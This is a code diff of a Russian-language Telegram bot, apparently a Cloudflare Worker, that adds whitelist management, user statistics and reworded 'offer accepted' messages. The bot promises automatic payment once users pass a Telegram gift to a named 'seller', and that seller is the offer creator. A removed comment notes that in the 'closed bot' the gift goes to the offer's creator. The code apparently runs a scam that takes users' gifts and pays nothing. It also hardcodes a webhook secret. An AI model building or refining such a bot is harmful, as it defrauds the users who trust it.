@@ -1,4 +1,4 @@
-const ADMIN_ID = 5151757168; // Только твой ID
+const ADMIN_ID = 5151757168; 
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
 
 export default {
@@ -17,7 +17,7 @@ export default {
       const update = await request.json();
 
       // ==========================================
-      // ПРОВЕРКА ДОСТУПА (ТОЛЬКО ДЛЯ ТЕХ, КОГО ДОБАВИЛ АДМИН)
+      // ПРОВЕРКА ДОСТУПА
       // ==========================================
       async function checkAccess(userId, username) {
           if (userId === ADMIN_ID) return true; 
@@ -34,7 +34,7 @@ export default {
       }
 
       // ==========================================
-      // КОМАНДЫ /add, /remove И /remove all (ТОЛЬКО ДЛЯ АДМИНА)
+      // КОМАНДЫ /add, /remove И /remove all
       // ==========================================
       if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
         const senderId = update.message.from.id;
@@ -84,9 +84,29 @@ export default {
         if (command === "/add") {
             if (targetUser.startsWith("@")) {
                 const uname = targetUser.slice(1).toLowerCase();
+                
+                const alreadyHas = await kv.get(`allowed_username:${uname}`);
+                if (alreadyHas) {
+                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `⚠️ Пользователь <b>@${uname}</b> уже имеет доступ.`, parse_mode: "HTML" }, BOT_TOKEN);
+                    return new Response("OK", { status: 200 });
+                }
+
+                const userId = await kv.get(`username_id:${uname}`);
+                if (!userId) {
+                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `⚠️ Пользователь <b>@${uname}</b> не найден в базе.\n\nПопросите его нажать /start в боте, после чего вы сможете его добавить.`, parse_mode: "HTML" }, BOT_TOKEN);
+                    return new Response("OK", { status: 200 });
+                }
+
                 await kv.put(`allowed_username:${uname}`, "true");
+                await kv.put(`allowed_id:${userId}`, "true");
                 await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь <b>@${uname}</b> добавлен.` , parse_mode: "HTML"}, BOT_TOKEN);
             } else {
+                const alreadyHas = await kv.get(`allowed_id:${targetUser}`);
+                if (alreadyHas) {
+                    await callApi("sendMessage", { chat_id: update.message.chat.id, text: `⚠️ Пользователь с ID <code>${targetUser}</code> уже имеет доступ.`, parse_mode: "HTML" }, BOT_TOKEN);
+                    return new Response("OK", { status: 200 });
+                }
+
                 await kv.put(`allowed_id:${targetUser}`, "true");
                 await callApi("sendMessage", { chat_id: update.message.chat.id, text: `✅ Пользователь с ID <code>${targetUser}</code> добавлен.`, parse_mode: "HTML" }, BOT_TOKEN);
             }
@@ -124,11 +144,15 @@ export default {
         try {
             let cursor = undefined;
             let accessList = [];
+            let totalUsers = 0;
             let totalOffers = 0;
 
             do {
                 const list = await kv.list({ cursor });
                 for (const key of list.keys) {
+                    if (key.name.startsWith("user:")) {
+                        totalUsers++;
+                    }
                     if (key.name.startsWith("offer:")) {
                         totalOffers++;
                     }
@@ -143,6 +167,7 @@ export default {
             } while (cursor);
 
             let statsText = `📊 <b>Статистика:</b>\n\n`;
+            statsText += `👥 <b>Всего игроков в боте:</b> ${totalUsers}\n`;
             statsText += `👤 <b>Пользователей с доступом:</b> ${accessList.length}\n`;
             statsText += `📦 <b>Активных офферов:</b> ${totalOffers}\n\n`;
             
@@ -166,7 +191,12 @@ export default {
         const userId = update.message.from.id;
         const username = update.message.from.username || "no_username";
 
-        if (kv) await kv.put(`user:${userId}`, username);
+        if (kv) {
+            await kv.put(`user:${userId}`, username);
+            if (username !== "no_username") {
+                await kv.put(`username_id:${username.toLowerCase()}`, userId.toString());
+            }
+        }
 
         const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок продавцу.\n4. Оплата приходит автоматически.`;
         
@@ -208,7 +238,6 @@ export default {
         if (iq.from.last_name) senderName += " " + iq.from.last_name;
         if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
         
-        // В ЗАКРЫТОМ БОТЕ ПОДАРОК ЛЕТИТ ТОМУ, КТО СОЗДАЛ ОФФЕР
         const targetReceiver = iq.from.username || "gwrex";
 
         let text = "";
@@ -303,16 +332,17 @@ export default {
           if (action === "acc") {
             await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: `Оффер принят ✅`, show_alert: true }, BOT_TOKEN);
             
+            // УБРАН ПРЕДПРОСМОТР И ТЕКСТ "ВАЖНО"
             const finalUrl = "https://t.me/" + targetReceiver;
 
             if (lang === "en") {
-                newText = `✅ <b>Accepted</b>\n\nTo receive <b>${amount} ${displayCurrency}</b>, send the gift to:\n\n‼️ <b>Important:</b> send the gift exactly to the seller <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
+                newText = `✅ <b>Accepted</b>\n\nTo receive <b>${amount} ${displayCurrency}</b>, send the gift to <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
                 newMarkup = { inline_keyboard: [[{ text: "Send Gift", url: finalUrl }]] };
             } else if (lang === "cn") {
-                newText = `✅ <b>已接受</b>\n\n要获得 <b>${amount} ${displayCurrency}</b>，请将礼物发送至：\n\n‼️ <b>重要：</b>请将礼物发送给卖家 <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
+                newText = `✅ <b>已接受</b>\n\n要获得 <b>${amount} ${displayCurrency}</b>，请将礼物发送至 <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
                 newMarkup = { inline_keyboard: [[{ text: "发送礼物", url: finalUrl }]] };
             } else {
-                newText = `✅ <b>Принято</b>\n\nЧтобы получить <b>${amount} ${displayCurrency}</b>, отправьте подарок:\n\n‼️ <b>Важно:</b> отправьте подарок именно продавцу <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
+                newText = `✅ <b>Принято</b>\n\nЧтобы получить <b>${amount} ${displayCurrency}</b>, передайте подарок <a href="https://t.me/${targetReceiver}">@${targetReceiver}</a>`;
                 newMarkup = { inline_keyboard: [[{ text: "Передать подарок", url: finalUrl }]] };
             }
           } else {
